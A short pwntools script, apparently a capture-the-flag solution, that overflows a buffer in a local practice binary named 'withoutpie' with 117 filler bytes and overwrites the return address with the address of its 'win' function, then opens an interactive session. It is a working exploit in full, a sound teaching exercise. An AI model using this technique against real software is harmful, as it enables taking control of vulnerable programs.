from pwn import *
r1= process('./withoutpie')
elf=ELF("./withoutpie")
execution= b's'*117+p32(elf.sym.win)
r1.sendline(execution)
r1.interactive()
r1.close
